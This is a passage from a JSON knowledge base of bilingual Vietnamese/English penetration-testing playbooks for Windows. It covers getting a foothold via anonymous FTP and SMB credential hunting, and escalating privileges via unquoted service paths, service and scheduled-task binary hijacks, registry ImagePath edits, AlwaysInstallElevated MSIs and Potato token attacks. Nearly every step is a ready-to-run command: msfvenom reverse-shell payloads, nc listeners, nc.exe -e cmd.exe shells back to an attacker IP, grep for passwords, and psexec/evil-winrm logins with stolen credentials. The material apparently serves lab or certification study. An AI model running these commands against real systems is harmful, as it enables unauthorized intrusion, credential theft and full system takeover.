    "os": ["Windows"],
    "tags": ["windows", "foothold", "ftp", "anonymous ftp", "file upload", "webshell", "reverse shell", "msfvenom"],
    "content": "## Playbook 11: Windows Foothold qua FTP Anonymous Login + Upload 🚪📄➡️🐚\n\n**Giả định:** FTP (Port 21) cho phép login `anonymous` và upload. Có web server.\n\n**Mục tiêu:** Giành reverse shell qua FTP upload.\n\n**Các bước thực hiện:**\n\n1.  **Kết nối FTP:** `ftp <target_ip>`, User: `anonymous`, Pass: `anonymous`.\n2.  **Kiểm tra Quyền ghi và Web Root:** Thử `put test.txt`. Tìm thư mục gốc web (ví dụ: `C:\\inetpub\\wwwroot`, `C:\\xampp\\htdocs`).\n3.  **Tạo và Tải lên Payload:**\n    * **Webshell (ASPX):** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=443 -f aspx -o shell.aspx`. FTP: `put shell.aspx`.\n    * **Executable (EXE):** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o rev.exe`. FTP: `put rev.exe`.\n4.  **Mở Listener:** `rlwrap nc -lvnp 4444` (cho EXE) hoặc `msfconsole multi/handler` (cho Meterpreter).\n5.  **Kích hoạt Payload:**\n    * **Webshell:** Truy cập `http://<target_ip>/shell.aspx` từ trình duyệt.\n    * **Executable:** Nếu có cách thực thi file (ví dụ: qua lỗ hổng khác, scheduled task), chạy `rev.exe`.",
    "steps": [
      { "vi": "**Kết nối FTP:** User: `anonymous`, Pass: `anonymous`.", "en": "**Connect FTP:** User: `anonymous`, Pass: `anonymous`.", "command": "ftp <target_ip>" },
      { "vi": "**Kiểm tra Quyền ghi & Web Root:** Thử `put test.txt`.", "en": "**Check Write Permissions & Web Root:** Try `put test.txt`." },
      { "vi": "**Tạo Webshell (ASPX):**", "en": "**Create Webshell (ASPX):**", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=443 -f aspx -o shell.aspx" },
      { "vi": "**Tải lên Webshell (FTP):**", "en": "**Upload Webshell (FTP):**", "command": "put shell.aspx" },
      { "vi": "**Tạo Executable (EXE):**", "en": "**Create Executable (EXE):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o rev.exe" },
      { "vi": "**Tải lên Executable (FTP):**", "en": "**Upload Executable (FTP):**", "command": "put rev.exe" },
      { "vi": "**Mở Listener (EXE):**", "en": "**Start Listener (EXE):**", "command": "rlwrap nc -lvnp 4444" },
      { "vi": "**Mở Listener (Meterpreter):**", "en": "**Start Listener (Meterpreter):**", "command": "msfconsole -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <kali_ip>; set LPORT 443; run'" },
      { "vi": "**Kích hoạt Webshell:** Truy cập URL.", "en": "**Trigger Webshell:** Access URL.", "command": "http://<target_ip>/shell.aspx" },
      { "vi": "**Kích hoạt Executable:** Chạy `rev.exe`.", "en": "**Trigger Executable:** Run `rev.exe`." }
    ],
    "related_knowledge_ids": ["port_21", "ftp", "msfvenom", "nc", "rce_kali_setup", "metasploit_msfvenom_handler"]
  },
  "playbook_12_windows_foothold_smb_share": {
    "title": {
      "vi": "Playbook 12: Windows Foothold qua SMB Share Credentials",
      "en": "Playbook 12: Windows Foothold via SMB Share Credentials"
    },
    "assumption": "Enumeration SMB (Null session hoặc creds yếu) cho phép truy cập một share chứa tệp cấu hình hoặc script có chứa credentials hợp lệ.",
    "objective": "Tìm credentials trong SMB share và sử dụng chúng để giành quyền truy cập.",
    "tools": ["smbclient", "crackmapexec", "grep", "impacket-psexec", "evil-winrm"],
    "phases": ["Enumeration", "Initial Foothold"],
    "techniques": ["SMB Enumeration", "Credential Hunting", "Lateral Movement"],
    "targets": ["SMB Share", "Windows Credentials"],
    "os": ["Windows"],
    "tags": ["windows", "foothold", "smb", "smbclient", "crackmapexec", "credential hunting", "psexec", "evil-winrm"],
    "content": "## Playbook 12: Windows Foothold qua SMB Share Credentials 🚪📂➡️🔑\n\n**Giả định:** Truy cập được SMB share chứa credentials.\n\n**Mục tiêu:** Tìm credentials và dùng chúng để có shell.\n\n**Các bước thực hiện:**\n\n1.  **Truy cập Share:** `smbclient //<target_ip>/<share_name> -N` (Null) hoặc `-U '<user>%<pass>'`.\n2.  **Tìm kiếm Credentials:**\n    * Tải về các tệp đáng ngờ: `mget *`.\n    * Phân tích tệp trên Kali: `grep -riE 'password|pass|secret' <downloaded_files>`. Tìm trong file config, script, backup.\n3.  **Xác thực Credentials:** Dùng `crackmapexec` để kiểm tra creds tìm được.\n    ```bash\n    crackmapexec smb <target_ip> -u <found_user> -p '<found_pass>' \n    ```\n   \n4.  **Giành Shell:** Nếu creds hợp lệ và có quyền:\n    * `impacket-psexec <domain>/<found_user>:<found_pass>@<target_ip>`\n    * `evil-winrm -i <target_ip> -u <found_user> -p '<found_pass>'`",
    "steps": [
      { "vi": "**Truy cập Share (Null):**", "en": "**Access Share (Null):**", "command": "smbclient //<target_ip>/<share_name> -N" },
      { "vi": "**Truy cập Share (Creds):**", "en": "**Access Share (Creds):**", "command": "smbclient //<target_ip>/<share_name> -U '<user>%<pass>'" },
      { "vi": "**Tải File (smbclient):**", "en": "**Download Files (smbclient):**", "command": "mget *" },
      { "vi": "**Tìm Creds (Kali):**", "en": "**Search Creds (Kali):**", "command": "grep -riE 'password|pass|secret' <downloaded_files>" },
      { "vi": "**Xác thực Creds:**", "en": "**Validate Creds:**", "command": "crackmapexec smb <target_ip> -u <found_user> -p '<found_pass>'" },
      { "vi": "**Giành Shell (PsExec):**", "en": "**Get Shell (PsExec):**", "command": "impacket-psexec <domain>/<found_user>:<found_pass>@<target_ip>" },
      { "vi": "**Giành Shell (Evil-WinRM):**", "en": "**Get Shell (Evil-WinRM):**", "command": "evil-winrm -i <target_ip> -u <found_user> -p '<found_pass>'" }
    ],
    "related_knowledge_ids": ["port_445", "smbclient", "impacket_smbclient", "smb_enumeration_tools", "crackmapexec", "ad_lateral_movement_crackmapexec", "psexec", "ad_lateral_movement_impacket", "evil_winrm_connection"]
  },
  "playbook_13_windows_privesc_unquoted_path": {
    "title": {
      "vi": "Playbook 13: Windows PrivEsc qua Unquoted Service Path",
      "en": "Playbook 13: Windows PrivEsc via Unquoted Service Path"
    },
    "assumption": "Có shell user Windows. `wmic service get ...` hoặc `PowerUp` (`Get-UnquotedServicePath`) phát hiện một service chạy với quyền cao có đường dẫn không được đặt trong dấu ngoặc kép và chứa dấu cách. Có quyền ghi vào một thư mục cha trong đường dẫn đó.",
    "objective": "Leo thang lên SYSTEM bằng cách lạm dụng unquoted service path.",
    "tools": ["wmic", "icacls", "msfvenom", "net", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Unquoted Service Path", "Insecure File Permissions"],
    "targets": ["Windows Services"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "unquoted service path", "wmic", "icacls", "msfvenom", "net start", "net stop"],
    "content": "## Playbook 13: Windows PrivEsc qua Unquoted Service Path 💻⬆️👑\n\n**Giả định:** Phát hiện unquoted service path với quyền ghi. Ví dụ: `C:\\Program Files\\Vuln Service\\service.exe`, có quyền ghi vào `C:\\Program Files\\`.\n\n**Mục tiêu:** Leo thang lên SYSTEM.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Service và Path:** Dùng `wmic service get name,pathname ...`.\n2.  **Kiểm tra Quyền ghi:** `icacls \"C:\\Program Files\\\"`.\n3.  **Tạo Payload:** Đặt tên payload theo phần đầu của path có dấu cách. Ví dụ `Program.exe`.\n    ```bash\n    # Trên Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o Program.exe \n    ```\n   \n4.  **Tải Payload lên:** Chuyển `Program.exe` vào thư mục có quyền ghi (`C:\\Program Files\\`).\n5.  **Mở Listener:** Trên Kali, `rlwrap nc -lvnp 4446`.\n6.  **Khởi động lại Service:**\n    ```powershell\n    net stop \"Vuln Service\" \n    net start \"Vuln Service\" \n    ```\n    (Lệnh tương tự)\n7.  **Xác nhận Shell SYSTEM.**",
    "steps": [
      { "vi": "**Xác định Service và Path:**", "en": "**Identify Service and Path:**", "command": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\" | findstr /i /v \"\\\"\"" }, // Lệnh wmic đầy đủ hơn
      { "vi": "**Kiểm tra Quyền ghi:** (Ví dụ cho C:\\Program Files\\)", "en": "**Check Write Permissions:** (Example for C:\\Program Files\\)", "command": "icacls \"C:\\Program Files\\\"" },
      { "vi": "**Tạo Payload (Kali):** Tên = phần đầu path (ví dụ: Program.exe)", "en": "**Create Payload (Kali):** Name = first part of path (e.g., Program.exe)", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o Program.exe" },
      { "vi": "**Tải Payload lên:** Vào thư mục có quyền ghi.", "en": "**Upload Payload:** To the writable directory." },
      { "vi": "**Mở Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Khởi động lại Service:**", "en": "**Restart Service:**", "command": "net stop \"Vuln Service\"; net start \"Vuln Service\"" }, // Gộp lệnh
      { "vi": "**Xác nhận Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" }
    ],
    "related_knowledge_ids": ["winprivesc_unquoted_service_path_vector", "wmic", "icacls", "msfvenom", "rce_kali_setup", "net stop", "net start", "winprivesc_service_binary_hijack"]
  },
  "playbook_14_windows_privesc_service_binary_hijack": {
    "title": {
      "vi": "Playbook 14: Windows PrivEsc qua Insecure Service Permissions (Binary Hijack)",
      "en": "Playbook 14: Windows PrivEsc via Insecure Service Permissions (Binary Hijack)"
    },
    "assumption": "Có shell user Windows. `icacls` hoặc `PowerUp` (`Get-ModifiableServiceFile`) xác nhận file thực thi của một service chạy với quyền cao (SYSTEM) có thể bị ghi đè bởi user hiện tại.",
    "objective": "Leo thang lên SYSTEM bằng cách thay thế service binary.",
    "tools": ["icacls", "Get-CimInstance", "msfvenom", "net", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Service Binary Hijacking", "Insecure File Permissions"],
    "targets": ["Windows Services"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "service hijack", "binary hijack", "insecure permissions", "icacls", "msfvenom", "net start", "net stop"],
    "content": "## Playbook 14: Windows PrivEsc qua Insecure Service Permissions (Binary Hijack) 💻⬆️👑\n\n**Giả định:** Phát hiện service binary có quyền ghi. Ví dụ: `C:\\Services\\VulnSvc.exe`.\n\n**Mục tiêu:** Leo thang lên SYSTEM.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Service và Quyền ghi:** `Get-CimInstance win32_service | ?{$_.PathName -like 'C:\\Services\\*'}`. `icacls \"C:\\Services\\VulnSvc.exe\"`.\n2.  **Tạo Payload:**\n    ```bash\n    # Trên Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o rev.exe \n    ```\n   \n3.  **Sao lưu và Thay thế Binary:**\n    ```powershell\n    # Sao lưu (quan trọng!)\n    copy C:\\Services\\VulnSvc.exe C:\\Windows\\Temp\\VulnSvc.bak \n    # Tải payload lên C:\\Windows\\Temp\\rev.exe\n    # Ghi đè\n    copy C:\\Windows\\Temp\\rev.exe C:\\Services\\VulnSvc.exe /Y \n    ```\n4.  **Mở Listener:** Trên Kali, `rlwrap nc -lvnp 4446`.\n5.  **Khởi động lại Service:**\n    ```powershell\n    net stop VulnSvc \n    net start VulnSvc \n    ```\n   \n6.  **Xác nhận Shell SYSTEM.**\n7.  **(Quan trọng) Khôi phục Binary Gốc:** Sau khi xong việc, dừng service và copy file `.bak` trở lại.",
    "steps": [
      { "vi": "**Xác định Service:**", "en": "**Identify Service:**", "command": "Get-CimInstance win32_service | ?{$_.PathName -like 'C:\\Services\\*'}" },
      { "vi": "**Kiểm tra Quyền ghi:**", "en": "**Check Write Permissions:**", "command": "icacls \"C:\\Services\\VulnSvc.exe\"" },
      { "vi": "**Tạo Payload (Kali):**", "en": "**Create Payload (Kali):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o rev.exe" },
      { "vi": "**Sao lưu Binary Gốc:**", "en": "**Backup Original Binary:**", "command": "copy C:\\Services\\VulnSvc.exe C:\\Windows\\Temp\\VulnSvc.bak" },
      { "vi": "**Tải Payload lên Target:** (ví dụ: vào C:\\Windows\\Temp\\rev.exe)", "en": "**Upload Payload to Target:** (e.g., to C:\\Windows\\Temp\\rev.exe)" },
      { "vi": "**Thay thế Binary:**", "en": "**Replace Binary:**", "command": "copy C:\\Windows\\Temp\\rev.exe C:\\Services\\VulnSvc.exe /Y" },
      { "vi": "**Mở Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Khởi động lại Service:**", "en": "**Restart Service:**", "command": "net stop VulnSvc; net start VulnSvc" },
      { "vi": "**Xác nhận Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" },
      { "vi": "**(Quan trọng) Khôi phục Binary Gốc:**", "en": "**(Important) Restore Original Binary:**", "command": "net stop VulnSvc; copy C:\\Windows\\Temp\\VulnSvc.bak C:\\Services\\VulnSvc.exe /Y; net start VulnSvc" }
    ],
    "related_knowledge_ids": ["winprivesc_insecure_service_permissions", "icacls", "Get-CimInstance", "msfvenom", "net stop", "net start", "rce_kali_setup", "winprivesc_service_binary_hijack"]
  },
  "playbook_15_windows_privesc_weak_registry": {
    "title": {
      "vi": "Playbook 15: Windows PrivEsc qua Weak Registry Permissions",
      "en": "Playbook 15: Windows PrivEsc via Weak Registry Permissions"
    },
    "assumption": "Có shell user Windows. `accesschk.exe` hoặc `PowerUp` (`Get-ModifiableRegistryAutoRun`) phát hiện user có quyền ghi (`KEY_ALL_ACCESS`) trên registry key của một service chạy với quyền cao (`HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service>`).",
    "objective": "Leo thang lên SYSTEM bằng cách sửa đổi ImagePath trong registry.",
    "tools": ["accesschk.exe", "reg", "msfvenom", "net", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Weak Registry Permissions", "Insecure Permissions"],
    "targets": ["Windows Registry", "Windows Services"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "registry permissions", "insecure permissions", "accesschk", "reg add", "msfvenom", "net start", "net stop"],
    "content": "## Playbook 15: Windows PrivEsc qua Weak Registry Permissions 💻⬆️👑\n\n**Giả định:** Phát hiện registry key của service có quyền ghi.\n\n**Mục tiêu:** Leo thang lên SYSTEM.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Quyền ghi Registry:**\n    ```powershell\n    # Tải accesschk.exe lên\n    .\\accesschk.exe /accepteula -uvwqk HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc \n    ```\n   \n2.  **Tạo Payload:**\n    ```bash\n    # Trên Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o rev.exe \n    ```\n   \n3.  **Tải Payload lên:** Chuyển `rev.exe` vào `C:\\Windows\\Temp\\`.\n4.  **Sửa đổi ImagePath:**\n    ```powershell\n    reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d C:\\Windows\\Temp\\rev.exe /f \n    ```\n   \n5.  **Mở Listener:** Trên Kali, `rlwrap nc -lvnp 4446`.\n6.  **Khởi động lại Service:**\n    ```powershell\n    net stop VulnSvc \n    net start VulnSvc \n    ```\n   \n7.  **Xác nhận Shell SYSTEM.**\n8.  **(Quan trọng) Khôi phục ImagePath Gốc:** Ghi lại giá trị cũ trước khi sửa và khôi phục sau đó.",
    "steps": [
      { "vi": "**Xác nhận Quyền ghi Registry:** (Yêu cầu accesschk.exe)", "en": "**Confirm Registry Write Permissions:** (Requires accesschk.exe)", "command": ".\\accesschk.exe /accepteula -uvwqk HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc" },
       { "vi": "**(Ghi lại ImagePath gốc):**", "en": "**(Record original ImagePath):**", "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath" }, // Thêm bước ghi lại
      { "vi": "**Tạo Payload (Kali):**", "en": "**Create Payload (Kali):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o rev.exe" },
      { "vi": "**Tải Payload lên Target:** (ví dụ: C:\\Windows\\Temp\\)", "en": "**Upload Payload to Target:** (e.g., C:\\Windows\\Temp\\)" },
      { "vi": "**Sửa đổi ImagePath:**", "en": "**Modify ImagePath:**", "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d C:\\Windows\\Temp\\rev.exe /f" },
      { "vi": "**Mở Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Khởi động lại Service:**", "en": "**Restart Service:**", "command": "net stop VulnSvc; net start VulnSvc" },
      { "vi": "**Xác nhận Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" },
      { "vi": "**(Quan trọng) Khôi phục ImagePath Gốc:**", "en": "**(Important) Restore Original ImagePath:**", "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d <Original_Path> /f" } // Thêm bước khôi phục
    ],
    "related_knowledge_ids": ["winprivesc_weak_registry_permissions", "accesschk.exe", "reg add", "reg query", "msfvenom", "net stop", "net start", "rce_kali_setup"]
  },
  "playbook_16_windows_privesc_scheduled_task_abuse": {
    "title": {
      "vi": "Playbook 16: Windows PrivEsc qua Scheduled Task Abuse",
      "en": "Playbook 16: Windows PrivEsc via Scheduled Task Abuse"
    },
    "assumption": "Có shell user Windows. `schtasks` hoặc `PowerUp` (`Get-ModifiableScheduledTaskFile`) phát hiện một scheduled task chạy với quyền cao (SYSTEM/Admin) có file thực thi nằm trong thư mục mà user hiện tại có quyền ghi.",
    "objective": "Leo thang quyền bằng cách thay thế file thực thi của scheduled task.",
    "tools": ["schtasks", "icacls", "msfvenom", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Scheduled Task Abuse", "Insecure File Permissions"],
    "targets": ["Windows Scheduled Tasks"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "scheduled tasks", "schtasks", "insecure permissions", "msfvenom"],
    "content": "## Playbook 16: Windows PrivEsc qua Scheduled Task Abuse 💻⬆️👑\n\n**Giả định:** Phát hiện scheduled task với file thực thi có thể ghi đè. Ví dụ: Task `Cleanup` chạy `C:\\Tasks\\cleanup.exe`.\n\n**Mục tiêu:** Leo thang quyền.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Task và Quyền ghi:** `schtasks /query /fo LIST /v | findstr /B /C:\"Task To Run\" /C:\"Run As User\"`. `icacls C:\\Tasks\\cleanup.exe`.\n2.  **Tạo Payload:**\n    ```bash\n    # Trên Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o cleanup.exe \n    ```\n   \n3.  **Sao lưu và Thay thế Executable:**\n    ```powershell\n    copy C:\\Tasks\\cleanup.exe C:\\Windows\\Temp\\cleanup.bak\n    # Tải payload lên C:\\Windows\\Temp\\cleanup.exe\n    copy C:\\Windows\\Temp\\cleanup.exe C:\\Tasks\\cleanup.exe /Y\n    ```\n4.  **Mở Listener:** Trên Kali, `rlwrap nc -lvnp 4446`.\n5.  **Chờ Task Chạy:** Đợi đến thời gian trigger của task hoặc thử kích hoạt thủ công nếu có thể (`schtasks /run /tn TaskName`).\n6.  **Xác nhận Shell Đặc quyền.**\n7.  **Khôi phục Executable Gốc.**",
    "steps": [
      { "vi": "**Xác định Task:**", "en": "**Identify Task:**", "command": "schtasks /query /fo LIST /v | findstr /B /C:\"Task To Run\" /C:\"Run As User\"" },
      { "vi": "**Kiểm tra Quyền ghi:**", "en": "**Check Write Permissions:**", "command": "icacls C:\\Tasks\\cleanup.exe" },
      { "vi": "**Tạo Payload (Kali):** (Tên file khớp với TaskToRun)", "en": "**Create Payload (Kali):** (Filename matches TaskToRun)", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 -f exe -o cleanup.exe" },
      { "vi": "**Sao lưu Executable Gốc:**", "en": "**Backup Original Executable:**", "command": "copy C:\\Tasks\\cleanup.exe C:\\Windows\\Temp\\cleanup.bak" },
      { "vi": "**Tải Payload lên Target:**", "en": "**Upload Payload to Target:**" },
      { "vi": "**Thay thế Executable:**", "en": "**Replace Executable:**", "command": "copy C:\\Windows\\Temp\\cleanup.exe C:\\Tasks\\cleanup.exe /Y" },
      { "vi": "**Mở Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Chờ Task Chạy:** (Hoặc kích hoạt thủ công)", "en": "**Wait for Task:** (Or trigger manually)", "command": "schtasks /run /tn TaskName" },
      { "vi": "**Xác nhận Shell Đặc quyền.**", "en": "**Confirm Privileged Shell.**" },
      { "vi": "**(Quan trọng) Khôi phục Executable Gốc:**", "en": "**(Important) Restore Original Executable:**" }
    ],
    "related_knowledge_ids": ["winprivesc_scheduled_tasks_vector", "schtasks", "icacls", "msfvenom", "rce_kali_setup"]
  },
  "playbook_17_windows_privesc_alwaysinstallelevated": {
    "title": {
      "vi": "Playbook 17: Windows PrivEsc qua AlwaysInstallElevated",
      "en": "Playbook 17: Windows PrivEsc via AlwaysInstallElevated"
    },
    "assumption": "Có shell user Windows. Kiểm tra registry (`reg query`) cho thấy cả hai key `HKCU\\...\\Installer\\AlwaysInstallElevated` và `HKLM\\...\\Installer\\AlwaysInstallElevated` đều được set giá trị là 1.",
    "objective": "Leo thang lên SYSTEM bằng cách cài đặt một MSI độc hại.",
    "tools": ["reg", "msfvenom", "msiexec", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["AlwaysInstallElevated"],
    "targets": ["Windows Installer Policy"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "alwaysinstallelevated", "registry", "msi", "msfvenom", "msiexec"],
    "content": "## Playbook 17: Windows PrivEsc qua AlwaysInstallElevated 💻⬆️👑\n\n**Giả định:** Cả hai registry key AlwaysInstallElevated đều được set là 1.\n\n**Mục tiêu:** Leo thang lên SYSTEM.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Registry Keys:**\n    ```powershell\n    reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n    reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n    ```\n   \n2.  **Tạo Payload MSI:**\n    ```bash\n    # Trên Kali\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 --platform windows -f msi -o rev.msi \n    ```\n   \n3.  **Tải Payload MSI lên:** Chuyển `rev.msi` vào `C:\\Windows\\Temp\\`.\n4.  **Mở Listener:** Trên Kali, `rlwrap nc -lvnp 4446`.\n5.  **Thực thi Trình cài đặt MSI:**\n    ```powershell\n    msiexec /quiet /qn /i C:\\Windows\\Temp\\rev.msi \n    ```\n   \n6.  **Xác nhận Shell SYSTEM.**",
    "steps": [
      { "vi": "**Xác nhận Registry Key (HKCU):**", "en": "**Confirm Registry Key (HKCU):**", "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
      { "vi": "**Xác nhận Registry Key (HKLM):**", "en": "**Confirm Registry Key (HKLM):**", "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
      { "vi": "**Tạo Payload MSI (Kali):**", "en": "**Create MSI Payload (Kali):**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4446 --platform windows -f msi -o rev.msi" },
      { "vi": "**Tải Payload MSI lên Target:** (ví dụ: C:\\Windows\\Temp\\)", "en": "**Upload MSI Payload to Target:** (e.g., C:\\Windows\\Temp\\)" },
      { "vi": "**Mở Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Thực thi Trình cài đặt MSI:**", "en": "**Execute MSI Installer:**", "command": "msiexec /quiet /qn /i C:\\Windows\\Temp\\rev.msi" },
      { "vi": "**Xác nhận Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" }
    ],
    "related_knowledge_ids": ["winprivesc_alwaysinstallelevated", "reg query", "msfvenom", "msiexec", "rce_kali_setup"]
  },
  "playbook_18_windows_privesc_seimpersonate": {
    "title": {
      "vi": "Playbook 18: Windows PrivEsc qua SeImpersonatePrivilege (Potato Attack)",
      "en": "Playbook 18: Windows PrivEsc via SeImpersonatePrivilege (Potato Attack)"
    },
    "assumption": "Có shell user Windows. `whoami /priv` cho thấy user có `SeImpersonatePrivilege` hoặc `SeAssignPrimaryTokenPrivilege` được bật.",
    "objective": "Leo thang lên SYSTEM bằng cách lạm dụng token impersonation.",
    "tools": ["whoami", "PrintSpoofer", "JuicyPotatoNG", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Token Impersonation", "Potato Attack", "SeImpersonatePrivilege"],
    "targets": ["Windows Privileges"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "seimpersonateprivilege", "token impersonation", "potato attack", "printspoofer", "juicypotatong"],
    "content": "## Playbook 18: Windows PrivEsc qua SeImpersonatePrivilege (Potato Attack) 💻⬆️👑\n\n**Giả định:** User có `SeImpersonatePrivilege`.\n\n**Mục tiêu:** Leo thang lên SYSTEM.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Privilege:** `whoami /priv`.\n2.  **Chọn và Tải Potato Tool:**\n    * **PrintSpoofer:** Thường hiệu quả trên các hệ thống mới hơn.\n    * **JuicyPotatoNG:** Cần tìm CLSID phù hợp (thường dùng WinPEAS để gợi ý).\n    * Tải tool (ví dụ `PrintSpoofer.exe`) lên `C:\\Windows\\Temp\\`.\n3.  **Tải Payload (Nếu cần):** Tải `nc.exe` lên `C:\\Windows\\Temp\\`.\n4.  **Mở Listener:** Trên Kali, `rlwrap nc -lvnp 4446`.\n5.  **Thực thi Potato Tool:**\n    * **PrintSpoofer:**\n      ```powershell\n      C:\\Windows\\Temp\\PrintSpoofer.exe -i -c \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4446 -e cmd.exe\" \n      ```\n     \n    * **JuicyPotatoNG (Ví dụ):**\n      ```powershell\n      C:\\Windows\\Temp\\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\nc.exe -a \"<kali_ip> 4446 -e cmd.exe\" \n      ```\n     \n6.  **Xác nhận Shell SYSTEM.**",
    "steps": [
      { "vi": "**Xác nhận Privilege:**", "en": "**Confirm Privilege:**", "command": "whoami /priv" },
      { "vi": "**Chọn và Tải Potato Tool:** (PrintSpoofer hoặc JuicyPotatoNG) vào C:\\Windows\\Temp\\.", "en": "**Select and Upload Potato Tool:** (PrintSpoofer or JuicyPotatoNG) to C:\\Windows\\Temp\\." },
      { "vi": "**Tải Payload (nc.exe) lên Target:** (Nếu dùng nc)", "en": "**Upload Payload (nc.exe) to Target:** (If using nc)" },
      { "vi": "**Mở Listener (Kali):**", "en": "**Start Listener (Kali):**", "command": "rlwrap nc -lvnp 4446" },
      { "vi": "**Thực thi PrintSpoofer:**", "en": "**Execute PrintSpoofer:**", "command": "C:\\Windows\\Temp\\PrintSpoofer.exe -i -c \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4446 -e cmd.exe\"" },
      { "vi": "**Thực thi JuicyPotatoNG (Ví dụ):**", "en": "**Execute JuicyPotatoNG (Example):**", "command": "C:\\Windows\\Temp\\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\nc.exe -a \"<kali_ip> 4446 -e cmd.exe\"" },
      { "vi": "**Xác nhận Shell SYSTEM.**", "en": "**Confirm SYSTEM Shell.**" }
    ],
    "related_knowledge_ids": ["winprivesc_token_impersonation", "whoami /priv", "privesc_windows", "printspoofer", "juicypotatong", "rce_kali_setup", "nc"]
  },
  "playbook_19_windows_privesc_sam_backup": {
    "title": {
      "vi": "Playbook 19: Windows PrivEsc qua SAM/SYSTEM Backup",
      "en": "Playbook 19: Windows PrivEsc via SAM/SYSTEM Backup"
    },
    "assumption": "Có shell user Windows. Tìm thấy các bản sao lưu của file SAM và SYSTEM registry hives (ví dụ trong `C:\\Windows\\Repair` hoặc `C:\\Windows\\System32\\config\\RegBack`) mà user hiện tại có thể đọc.",
    "objective": "Trích xuất NTLM hashes từ các bản sao lưu và sử dụng chúng để leo thang.",
    "tools": ["dir", "copy", "impacket-secretsdump", "evil-winrm", "impacket-psexec"],
    "phases": ["Privilege Escalation", "Credential Access"],
    "techniques": ["Offline Hash Dumping", "Pass the Hash"],
    "targets": ["SAM Hive", "SYSTEM Hive"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "sam dump", "system hive", "offline hash dump", "impacket-secretsdump", "pass the hash", "pth"],
